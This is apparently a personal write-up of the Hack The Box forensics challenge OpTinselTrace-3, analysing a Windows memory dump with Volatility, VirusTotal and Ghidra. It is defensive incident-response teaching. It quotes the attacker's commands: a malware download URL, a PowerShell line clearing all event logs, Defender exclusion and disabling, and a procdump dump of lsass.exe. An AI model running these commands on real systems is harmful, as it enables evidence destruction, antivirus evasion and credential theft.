---
title: OpTinselTrace-3
date: 2024-12-31
categories: [DFIR, writeup]
tags: [DFIR, Hack The Box]      # TAG names should always be lowercase
---




# OpTinselTrace-3 on HTB


## Box info:


"About OpTinselTrace-3


Operation Tinsel Trace consists of five Sherlocks following the compromise of Father Christmas’s festive operations by a formidable, infamous adversary: The Grinch! As the festive season approaches, the North Pole is buzzing with activity. But not all is merry in Santa's workshop as a series of sophisticated cyber attacks threaten to disrupt Christmas. Operation Tinsel Trace will lead you inside the technology of Santa’s tech, configuration, logs, and servers until, at a certain point, everything seems to be doomed. Will you be able to recover from this advanced attack? Please note - these Sherlocks are built to be completed sequentially and in order!"


* Senario


Oh no! Our IT admin is a bit of a cotton-headed ninny-muggins, ByteSparkle left his VPN configuration file in our fancy private S3 location! The nasty attackers may have gained access to our internal network. We think they compromised one of our TinkerTech workstations. Our security team has managed to grab you a memory dump - please analyse it and answer the questions! Santa is waiting… Please note - these Sherlocks are built to be completed sequentially and in order!






## Task 1:


* What is the name of the file that is likely copied from the shared folder (including the file extension)?
   * For this challenge we are given a memory dump of a windows system. Using Volatility we can pick apart this dump and obtain the forensic information that we need.
   * We can use the windows filescan plugin to list all the files in the dump and the addresses. I will save this in `files.txt`.
   * `vol -f santaclaus.bin windows.filescan.FileScan > files.txt`
   * Next we can begin to `grep` these results. I like to start with typical dies such as `Desktop`,`Downloads` etc...
   * `cat files.txt | grep -e Desktop -e Downloads`
   ![alt text](../assets/imgs/tinselimgs/image.png)
   * Based on the above we see the file `present_for_santa.zip` as this is somewhat of a sus file. I submitted it for this first flag and it was correct.


## Task 2 and 3:
These tasks are completed side by side so I will group them together.
* What is the file name used to trigger the attack (including the file extension)?
   * In filescan dump we found the `present_for_santa.zip` we can use the dump files plugin in volatility to dump that file by supplying the virtual address of the file.


   * `vol -f santaclaus.bin  windows.dumpfiles.DumpFiles --virtaddr 0xa48df8fb42a0`


   ![alt text](../assets/imgs/tinselimgs/image-1.png)


   * We can then unzip that zip folder.


   ![alt text](../assets/imgs/tinselimgs/image-2.png)


   * Now we examine the files within.


   ![alt text](../assets/imgs/tinselimgs/image-3.png)


   * These are our flags for tasks 2 and 3. The linker script points to the vbs script.


## Task 4:


* What is the name of the program used by the vbs script to execute the next stage?


   * First thing I did with the sample was upload it to VT for analysis.


   ![alt text](../assets/imgs/tinselimgs/image-4.png)


   * Looking through the behavior we can see multiple HTTP requests.


   ![alt text](../assets/imgs/tinselimgs/image-5.png)


   * We can also see what files the program interacts with.


   ![alt text](../assets/imgs/tinselimgs/image-6.png)


   * Powershell jumps out so lets try that as the flag...


   ![alt text](../assets/imgs/tinselimgs/image-7.png)






## Task 5:


* What is the name of the function used for the powershell script obfuscation?
   * Looking through more of the behavior tab on VT I saw reference to an interesting looking function.


   ![alt text](../assets/imgs/tinselimgs/image-8.png)
   * This nets us "WrapPresent` as our flag.








## Task 6:


* What is the URL that the next stage was downloaded from?


   * We can find this in the network connections section of the VT behavior tab.


   * `GET http://77.74.198.52/destroy_christmas/evil_present.jpg`


![alt text](../assets/imgs/tinselimgs/image-9.png)




## Task 7:


* What is the IP and port that the executable downloaded the shellcode from (IP:Port)?


   * We can find this below the network connections section in the ip traffic section of the present.exe file.


   * First we need to find the exe file and then dump it
   ![alt text](../assets/imgs/tinselimgs/image-12.png)


   ![alt text](../assets/imgs/tinselimgs/image-13.png)


   * Next I picked apart the file for a bit in Ghidra.


   * I found a reference to the ip that was used in the VBS script.


   ![alt text](../assets/imgs/tinselimgs/image-14.png)


   * It wasn't until I looked at the VT page until I found the port. This probably could have been easily found with dynamic analysis but I didn't have a lab setup easily available.


   ![alt text](../assets/imgs/tinselimgs/image-11.png)








## Task 8:


* What is the process ID of the remote process that the shellcode was injected into?




![alt text](../assets/imgs/tinselimgs/image-15.png)


## Task 9:


* After the attacker established a Command & Control connection, what command did they use to clear all event logs?




![alt text](../assets/imgs/tinselimgs/image-16.png)


![alt text](../assets/imgs/tinselimgs/image-17.png)


![alt text](../assets/imgs/tinselimgs/image-18.png)


![alt text](../assets/imgs/tinselimgs/image-19.png)


`pipx install python-evtx`




`evtx_dump.py 'file.0xa48dfefe6e50.0xa48dfe639190.DataSectionObject.Windows PowerShell.evtx.dat' > powershell_log `




We can find the following line `Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }`


![alt text](../assets/imgs/tinselimgs/image-21.png)


![alt text](../assets/imgs/tinselimgs/image-22.png)


I also noticed this line `Add-MpPreference -DisDisableRealtimeMonitoring True` this line disables antivirus monitoring.


![alt text](../assets/imgs/tinselimgs/image-20.png)




## Task 10:


* What is the full path of the folder that was excluded from defender?




Next we can find the line here:
`Add-MpPreference -ExclusionPath c:\users\public`


![alt text](../assets/imgs/tinselimgs/image-23.png)


![alt text](../assets/imgs/tinselimgs/image-24.png)


## Task 11:


* What is the original name of the file that was ingressed to the victim?


   * First we can see a exe in the powershell log


   ![alt](../assets/imgs/tinselimgs/image-25.png)


   * Lets dig this up in the memory dump


   * `cat files | grep Public`


   ![alt text](../assets/imgs/tinselimgs/image-26.png)




   * Now lets dump that exe `vol -f santaclaus.bin windows.dumpfiles.DumpFiles --virtaddr 0xa48e00d10a90 `


   ![alt text](../assets/imgs/tinselimgs/image-27.png)


   * Now let's pop it into VT and see what we find.


   ![alt text](../assets/imgs/tinselimgs/image-28.png)


   * It appears the alt name of this file is `procdump.exe`


## Task 12:


* What is the name of the process targeted by procdump.exe?


   * We can find this back in the powershell log.


   ![alt text](../assets/imgs/tinselimgs/image-29.png)


   * A breakdown of the command from ChatGPT:



```
This command is using ProcDump, a Microsoft Sysinternals tool, to create a memory dump of the lsass.exe process, which is crucial for the Windows authentication system. Let's break it down to understand each part of the command.
Breaking it Down:


   C:\Users\public\procdump.exe:
       This specifies the location of the procdump.exe executable, which is a command-line tool used for capturing process dumps. These dumps contain the memory contents of a running process, useful for debugging or analysis.
       The tool is typically used to create crash dumps of a program's memory when it encounters a problem, or for forensic purposes.


   -accepteula:
       This flag automatically accepts the End User License Agreement (EULA) for ProcDump. Normally, when running procdump for the first time, it will ask the user to accept the EULA. This flag bypasses that prompt and automatically accepts it.


   -r:
       This flag tells procdump to capture a dump file when the process terminates unexpectedly (or based on specific criteria like performance triggers). It's typically used in situations where you want to capture a dump of a process only when it crashes.


   -ma:
       This flag indicates that a full memory dump should be created. A full dump includes all of the memory of the process, which can be quite large, but it provides comprehensive information about the state of the process at the time of the dump.


   lsass.exe:
       lsass.exe stands for Local Security Authority Subsystem Service. This is a critical Windows process responsible for enforcing the security policy on the system. It handles authentication, including login requests, password validation, and generating access tokens for user sessions.
       lsass.exe is sensitive because it contains authentication data, such as user credentials (password hashes), and is often targeted in attacks like credential dumping.


   C:\Users\public\stolen_gift.dmp:
       This is the location and name of the file where the memory dump will be saved. In this case, it's being saved to C:\Users\public\stolen_gift.dmp.
       A .dmp file is a dump file that contains the process's memory at the time the dump was created. It can be analyzed later to gather detailed information about the process's state, including any potentially sensitive information it contains.


What is the Command Doing?


   Capturing a Full Memory Dump of lsass.exe:
       This command is instructing procdump to create a full memory dump of the lsass.exe process.
   Potential Forensics or Malicious Activity:


       Why lsass.exe?: The lsass.exe process is critical because it handles security authentication and stores sensitive data, such as password hashes. By dumping the memory of lsass.exe, an attacker or malicious actor can extract this sensitive information (e.g., NTLM hashes, Kerberos tickets, or even plaintext passwords in certain circumstances).


       The memory dump is being saved to a file called stolen_gift.dmp in the C:\Users\public\ folder. The name stolen_gift is a suspicious choice, as it implies the dump is being taken for malicious purposes (i.e., stealing data).

```


# Conclusion:


![alt text](../assets/imgs/tinselimgs/image-30.png)


Overall this was a fun forensics challenge that heavily involved volatility as well as VirusTotal results with some brief log analysis.















